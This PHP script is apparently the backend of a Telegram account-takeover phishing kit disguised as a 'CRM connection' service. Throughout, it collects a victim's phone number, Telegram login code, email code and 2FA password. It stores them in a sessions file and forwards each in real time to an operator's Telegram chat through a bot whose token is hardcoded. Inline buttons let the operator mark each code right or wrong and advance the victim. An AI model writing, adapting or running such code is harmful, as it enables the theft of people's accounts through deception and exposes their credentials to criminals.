<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Включите отладку
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Настройки
$BOT_TOKEN = '7992834659:AAFLuj0-5S5HvNy0OoEf1_a8wAOWz5acBgY';
$ADMIN_CHAT_ID = '6897915758';
$SESSIONS_FILE = 'sessions.json';

// Создаем файл сессий если его нет
if (!file_exists($SESSIONS_FILE)) {
    file_put_contents($SESSIONS_FILE, json_encode([]));
}

// Функция отправки в Telegram
function sendTelegram($chat_id, $text, $keyboard = null) {
    global $BOT_TOKEN;
    
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'ignore_errors' => true
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result !== false;
}

// Получаем данные
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    echo json_encode(['success' => false, 'error' => 'Нет данных']);
    exit;
}

$action = $data['action'] ?? '';
$response = ['success' => false];

// Загружаем сессии
$sessions = json_decode(file_get_contents($SESSIONS_FILE), true) ?: [];

switch ($action) {
    case 'new_session':
        $session_id = $data['session_id'] ?? '';
        $phone = $data['phone'] ?? '';
        $country_code = $data['country_code'] ?? '7';
        
        if (!$session_id || !$phone) {
            $response = ['success' => false, 'error' => 'Нет данных'];
            break;
        }
        
        // Сохраняем сессию
        $sessions[$session_id] = [
            'phone' => $phone,
            'country_code' => $country_code,
            'status' => 'pending',
            'current_step' => 'phone',
            'code_status' => 'none',
            'created_at' => time(),
            'codes' => [],
            'user_current_step' => 2 // Шаг на котором пользователь
        ];
        
        // Сохраняем в файл
        file_put_contents($SESSIONS_FILE, json_encode($sessions, JSON_PRETTY_PRINT));
        
        // Отправляем оператору
        $message = "📱 <b>НОВЫЙ ЗАПРОС НА ПОДКЛЮЧЕНИЕ К CRM</b>\n\n";
        $message .= "📞 <b>Телефон:</b> {$phone}\n";
        $message .= "🌍 <b>Страна:</b> +{$country_code}\n";
        $message .= "🆔 <b>ID:</b> <code>{$session_id}</code>\n";
        $message .= "🕐 <b>Время:</b> " . date('H:i:s') . "\n\n";
        $message .= "👇 <b>Выберите действие:</b>";
        
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '📱 Код ТГ', 'callback_data' => "tg_code:{$session_id}"],
                    ['text' => '📧 Email код', 'callback_data' => "email_code:{$session_id}"]
                ],
                [
                    ['text' => '❌ Отклонить', 'callback_data' => "deny:{$session_id}"]
                ]
            ]
        ];
        
        sendTelegram($ADMIN_CHAT_ID, $message, $keyboard);
        
        $response = ['success' => true];
        break;
        
    case 'check_status':
        $session_id = $data['session_id'] ?? '';
        
        if (isset($sessions[$session_id])) {
            $response = [
                'success' => true,
                'status' => $sessions[$session_id]['current_step']
            ];
        } else {
            $response = ['success' => false, 'error' => 'Сессия не найдена'];
        }
        break;
        
    case 'send_code':
        $session_id = $data['session_id'] ?? '';
        $code = $data['code'] ?? '';
        $code_type = $data['code_type'] ?? '';
        
        if (!$session_id || !$code) {
            $response = ['success' => false, 'error' => 'Нет кода'];
            break;
        }
        
        if (isset($sessions[$session_id])) {
            // Сохраняем код
            $sessions[$session_id]['codes'][$code_type] = $code;
            $sessions[$session_id]['code_status'] = 'waiting';
            $sessions[$session_id]['code_type'] = $code_type;
            
            // Определяем текущий шаг пользователя
            $current_step = 3; // По умолчанию код ТГ
            if ($code_type === 'email_code') {
                $current_step = 4;
            } elseif ($code_type === 'password_2fa') {
                $current_step = 5;
            }
            $sessions[$session_id]['user_current_step'] = $current_step;
            
            file_put_contents($SESSIONS_FILE, json_encode($sessions, JSON_PRETTY_PRINT));
            
            // Отправляем оператору
            $code_names = [
                'tg_code' => '📱 Код из Telegram',
                'email_code' => '📧 Email код',
                'password_2fa' => '🔐 Пароль 2FA'
            ];
            $code_name = $code_names[$code_type] ?? 'Код';
            
            $message = "🔢 <b>ПОЛУЧЕН КОД ОТ ПОЛЬЗОВАТЕЛЯ</b>\n\n";
            $message .= "📞 <b>Телефон:</b> {$sessions[$session_id]['phone']}\n";
            $message .= "🆔 <b>ID:</b> <code>{$session_id}</code>\n";
            $message .= "📋 <b>Тип:</b> {$code_name}\n";
            $message .= "🔐 <b>Код:</b> <code>{$code}</code>\n\n";
            $message .= "👇 <b>Проверьте код:</b>";
            
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '✅ Код верный', 'callback_data' => "correct:{$session_id}"]
                    ],
                    [
                        ['text' => '❌ Код неверный', 'callback_data' => "incorrect:{$session_id}"]
                    ],
                    [
                        ['text' => '⏭️ Следующий шаг', 'callback_data' => "next_step:{$session_id}"]
                    ]
                ]
            ];
            
            sendTelegram($ADMIN_CHAT_ID, $message, $keyboard);
            
            $response = ['success' => true];
        } else {
            $response = ['success' => false, 'error' => 'Сессия не найдена'];
        }
        break;
        
    case 'check_code_status':
        $session_id = $data['session_id'] ?? '';
        
        if (isset($sessions[$session_id])) {
            $next_step = null;
            // Если код верный и это не пароль 2FA, то следующий шаг - пароль 2FA
            if ($sessions[$session_id]['code_status'] === 'correct' && 
                $sessions[$session_id]['code_type'] !== 'password_2fa') {
                $next_step = 'password_2fa';
            }
            
            $response = [
                'success' => true,
                'status' => $sessions[$session_id]['code_status'] ?? 'none',
                'next_step' => $next_step
            ];
        } else {
            $response = ['success' => false, 'error' => 'Сессия не найдена'];
        }
        break;
        
    case 'complete_auth':
        $session_id = $data['session_id'] ?? '';
        
        if (isset($sessions[$session_id])) {
            $sessions[$session_id]['current_step'] = 'completed';
            $sessions[$session_id]['completed_at'] = time();
            
            file_put_contents($SESSIONS_FILE, json_encode($sessions, JSON_PRETTY_PRINT));
            
            // Уведомляем оператора
            $message = "🎉 <b>ПОДКЛЮЧЕНИЕ К CRM УСПЕШНО</b>\n\n";
            $message .= "📞 <b>Телефон:</b> {$sessions[$session_id]['phone']}\n";
            $message .= "🆔 <b>ID:</b> <code>{$session_id}</code>\n";
            $message .= "✅ <b>Статус:</b> Подключен\n";
            $message .= "🕐 <b>Время:</b> " . date('H:i:s');
            
            sendTelegram($ADMIN_CHAT_ID, $message);
            
            $response = ['success' => true];
        } else {
            $response = ['success' => false, 'error' => 'Сессия не найдена'];
        }
        break;
        
    case 'test':
        $response = [
            'success' => true,
            'message' => 'Сервер работает!',
            'sessions_count' => count($sessions),
            'time' => date('H:i:s')
        ];
        break;
        
    default:
        $response = ['success' => false, 'error' => 'Неизвестное действие'];
}

echo json_encode($response, JSON_UNESCAPED_UNICODE);
?>